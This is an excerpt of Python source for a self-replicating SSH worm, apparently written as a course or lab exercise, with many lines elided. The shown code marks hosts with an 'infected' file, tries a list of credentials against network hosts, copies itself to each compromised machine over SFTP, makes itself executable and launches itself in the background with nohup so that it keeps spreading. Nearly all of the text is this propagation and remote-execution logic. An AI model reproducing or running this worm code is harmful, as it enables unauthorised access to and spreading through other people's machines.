...
Infected_Marker_File = "/home/ubuntu/rwinfected.txt"
...
def markInfected():
	...
	# Create rwinfected.txt file
	markerFile = open(Infected_Marker_File,"w")

	# Write to file
	markerFile.write("Have a wormy day! :) ")
...
def spreadAndExecute(sshClient):
	...
	print "I am about to copy"
	sftpClient.put("replicator_worm.py", "/home/ubuntu/replicator_worm.py")

	# Make the worm file exeutable on the remote system
	sshClient.exec_command("chmod a+x /home/ubuntu/replicator_worm.py")

	# Execute the worm!
	# nohup - keep the worm running after we disconnect.
	# python - the python interpreter
	# & - run the whole commnad in the background
	sshClient.exec_command("nohup python /home/ubuntu/replicator_worm.py 2> error.txt > output.txt &")
...
def attackSystem(host):
	...
	# Create a global variable of credential lists
	global credList
	...
	# Working credentials weren't found
	return connection
...
for host in networkHosts:
	...
	if sshInfo:
		...
		try:
			...
			localpath = "/home/ubuntu/rwinfected.txt"
			...
			exit(1)
		print "No targets found, worm signing off..."
sys.exit(0)	
